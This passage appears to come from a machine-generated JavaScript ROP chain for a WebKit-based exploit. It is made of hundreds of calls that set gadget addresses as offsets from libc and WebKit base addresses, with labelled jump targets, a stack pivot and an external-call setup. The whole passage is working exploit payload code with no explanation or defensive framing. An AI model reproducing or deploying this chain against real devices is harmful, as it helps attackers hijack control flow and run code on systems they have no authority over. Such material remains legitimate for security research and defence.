set_gadget(libc_base+768796,);
//L448:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+83960,//L450
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+83944,//L449
webkit_base+4687784,
libc_base+165442
]);
//L449:
db([0,0]);
set_gadget(libc_base+768796,);
//L450:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+84056,//L453
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L451:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L453:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+84144,//L455
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+84160,//L456
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L455:
db([0,0]);
set_gadget(libc_base+772328,);
//L456:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+84304,//L459
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+84272,//L457
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+84288,//L458
webkit_base+4687784,
libc_base+165442
]);
//L457:
db([0,0]);
set_gadget(libc_base+772328,);
//L458:
db([0,0]);
set_gadget(libc_base+768796,);
//L459:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+84376,//L461
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L461:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+84432,//L463
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L463:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+84528,//L466
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L464:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L466:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+84616,//L468
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+84632,//L469
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L468:
db([0,0]);
set_gadget(libc_base+772328,);
//L469:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+84792,//L471
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+84824,//L473
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+84776,//L470
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+84808,//L472
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L470:
db([0,0]);
set_gadget(libc_base+165442,);
//L471:
db([0,0]);
set_gadget(libc_base+772328,);
//L472:
db([0,0]);
set_gadget(libc_base+768796,);
//L473:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+84952,//L475
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+84968,//L476
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+84936,//L474
webkit_base+4687784,
libc_base+165442
]);
//L474:
db([0,0]);
set_gadget(libc_base+772328,);
//L475:
db([0,0]);
set_gadget(libc_base+768796,);
//L476:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+85056,//L478
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L478:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+85112,//L480
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L480:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+85184,//L482
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L482:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+85240,//L484
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L484:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
//L485:
libc_base+713278,
ropchain+85344,//L488
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L486:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L488:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+85432,//L490
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+85448,//L491
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L490:
db([0,0]);
set_gadget(libc_base+772328,);
//L491:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+85608,//L493
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+85640,//L495
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+85592,//L492
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+85624,//L494
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L492:
db([0,0]);
set_gadget(libc_base+165442,);
//L493:
db([0,0]);
set_gadget(libc_base+772328,);
//L494:
db([0,0]);
set_gadget(libc_base+768796,);
//L495:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+85736,//L497
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+85720,//L496
webkit_base+4687784,
libc_base+165442
]);
//L496:
db([0,0]);
set_gadget(libc_base+768796,);
//L497:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+85824,//L499
webkit_base+4687784,
libc_base+713278
]);
//L498:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L499:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+85896,//L502
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L500:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L502:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+85960,//L504
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L504:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+74104,//L202
//L235:
libc_base+713278,
ropchain+86072,//L507
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L505:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L507:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+86160,//L509
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+86176,//L510
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L509:
db([0,0]);
set_gadget(libc_base+772328,);
//L510:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+86304,//L512
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+86320,//L513
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+86288,//L511
webkit_base+4687784,
libc_base+165442
]);
//L511:
db([0,0]);
set_gadget(libc_base+772328,);
//L512:
db([0,0]);
set_gadget(libc_base+768796,);
//L513:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+86424,//L514
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+86440,//L515
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L514:
db([0,0]);
set_gadget(libc_base+768796,);
//L515:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+86560,//L516
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+86544,//L517
webkit_base+4687784,
libc_base+768796
]);
//L517:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L516:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+86648,//L519
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+86632,//L518
webkit_base+4687784,
libc_base+165442
]);
//L518:
db([0,0]);
set_gadget(libc_base+768796,);
//L519:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+86752,//L520
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+86768,//L521
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L520:
db([0,0]);
set_gadget(libc_base+768796,);
//L521:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+86888,//L522
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+86872,//L523
webkit_base+4687784,
libc_base+768796
]);
//L523:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L522:
db([0,0]);
//_create_extcall:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+86960,//L525
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L525:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+87024,//L527
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L527:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L528:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L530:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+87176,//L532
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+87192,//L533
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L532:
db([0,0]);
set_gadget(libc_base+772328,);
//L533:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+87312,//L537
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+87296,//L536
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L534:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+165442,);
//L536:
db([0,0]);
set_gadget(libc_base+772328,);
//L537:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L538:
db([16,0]);// 0x10
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+87440,//L541
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+87456,//L542
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L541:
db([0,0]);
set_gadget(libc_base+772328,);
//L542:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+87600,//L545
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+87568,//L543
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+87584,//L544
webkit_base+4687784,
libc_base+165442
]);
//L543:
db([0,0]);
set_gadget(libc_base+772328,);
//L544:
db([0,0]);
set_gadget(libc_base+768796,);
//L545:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+87672,//L547
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L547:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+87728,//L549
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L549:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+87824,//L551
webkit_base+4687784,
libc_base+768796
]);
//L550:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L551:
db([0,0]);
set_gadget(libc_base+772328,);
//L552:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+87920,//L553
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+87936,//L554
webkit_base+4687784,
libc_base+772328
]);
//L553:
db([0,0]);
set_gadget(libc_base+768796,);
//L554:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+88024,//L556
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L556:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+88080,//L558
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L558:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+88200,//L561
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L559:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L561:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+88288,//L563
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+88304,//L564
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L563:
db([0,0]);
set_gadget(libc_base+772328,);
//L564:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+88448,//L567
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+88416,//L565
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+88432,//L566
webkit_base+4687784,
libc_base+165442
]);
//L565:
db([0,0]);
set_gadget(libc_base+772328,);
//L566:
db([0,0]);
set_gadget(libc_base+768796,);
//L567:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+88520,//L569
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L569:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+88576,//L571
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L571:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+88672,//L573
webkit_base+4687784,
libc_base+768796
]);
//L572:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L573:
db([0,0]);
set_gadget(libc_base+772328,);
//L574:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+88768,//L575
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+88784,//L576
webkit_base+4687784,
libc_base+772328
]);
//L575:
db([0,0]);
set_gadget(libc_base+768796,);
//L576:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+88872,//L578
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L578:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+88928,//L580
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L580:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+89000,//L582
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L582:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+89056,//L584
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L584:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L585:
pivot_addr,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+89208,//L588
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L586:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L588:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+89296,//L590
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+89312,//L591
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L590:
db([0,0]);
set_gadget(libc_base+772328,);
//L591:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+89456,//L594
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+89424,//L592
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+89440,//L593
webkit_base+4687784,
libc_base+165442
]);
//L592:
db([0,0]);
set_gadget(libc_base+772328,);
//L593:
db([0,0]);
set_gadget(libc_base+768796,);
//L594:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+89528,//L596
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L596:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+89584,//L598
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L598:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+89680,//L600
webkit_base+4687784,
libc_base+768796
]);
//L599:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L600:
db([0,0]);
set_gadget(libc_base+772328,);
//L601:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+89776,//L602
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+89792,//L603
webkit_base+4687784,
libc_base+772328
]);
//L602:
db([0,0]);
set_gadget(libc_base+768796,);
//L603:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+89880,//L605
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L605:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+89936,//L607
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L607:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+90008,//L609
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L609:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+90064,//L611
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L611:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+90168,//L614
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L612:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L614:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+90256,//L616
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+90272,//L617
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L616:
db([0,0]);
set_gadget(libc_base+772328,);
//L617:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+90416,//L620
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+90384,//L618
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+90400,//L619
webkit_base+4687784,
libc_base+165442
]);
//L618:
db([0,0]);
set_gadget(libc_base+772328,);
//L619:
db([0,0]);
set_gadget(libc_base+768796,);
//L620:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+90488,//L622
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L622:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+90544,//L624
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L624:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+90640,//L626
webkit_base+4687784,
libc_base+768796
]);
//L625:
db([8,0]);// 0x8
set_gadget(webkit_base+3789839,);//pop r11
//L626:
db([0,0]);
set_gadget(libc_base+772328,);
//L627:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+90736,//L628
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+90752,//L629
webkit_base+4687784,
libc_base+772328
]);
//L628:
db([0,0]);
set_gadget(libc_base+768796,);
//L629:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+90840,//L631
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L631:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+90896,//L633
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L633:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+91016,//L636
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L634:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L636:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+91104,//L638
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+91120,//L639
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L638:
db([0,0]);
set_gadget(libc_base+772328,);
//L639:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+91264,//L642
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+91232,//L640
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+91248,//L641
webkit_base+4687784,
libc_base+165442
]);
//L640:
db([0,0]);
set_gadget(libc_base+772328,);
//L641:
db([0,0]);
set_gadget(libc_base+768796,);
//L642:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+91336,//L644
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L644:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+91392,//L646
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L646:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+91488,//L648
webkit_base+4687784,
libc_base+768796
]);
//L647:
db([7,0]);// 0x7
set_gadget(webkit_base+3789839,);//pop r11
//L648:
db([0,0]);
set_gadget(libc_base+772328,);
//L649:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+91584,//L650
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+91600,//L651
webkit_base+4687784,
libc_base+772328
]);
//L650:
db([0,0]);
set_gadget(libc_base+768796,);
//L651:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+91688,//L653
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L653:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+91744,//L655
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L655:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+91816,//L657
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L657:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+91872,//L659
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L659:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+91976,//L662
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L660:
db([40,0]);// 0x28
set_gadget(libc_base+772328,);
//L662:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+92064,//L664
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+92080,//L665
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L664:
db([0,0]);
set_gadget(libc_base+772328,);
//L665:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+92224,//L668
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+92192,//L666
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+92208,//L667
webkit_base+4687784,
libc_base+165442
]);
//L666:
db([0,0]);
set_gadget(libc_base+772328,);
//L667:
db([0,0]);
set_gadget(libc_base+768796,);
//L668:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+92320,//L671
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L669:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L671:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+92408,//L673
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+92424,//L674
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L673:
db([0,0]);
set_gadget(libc_base+772328,);
//L674:
db([0,0]);
set_gadgets([
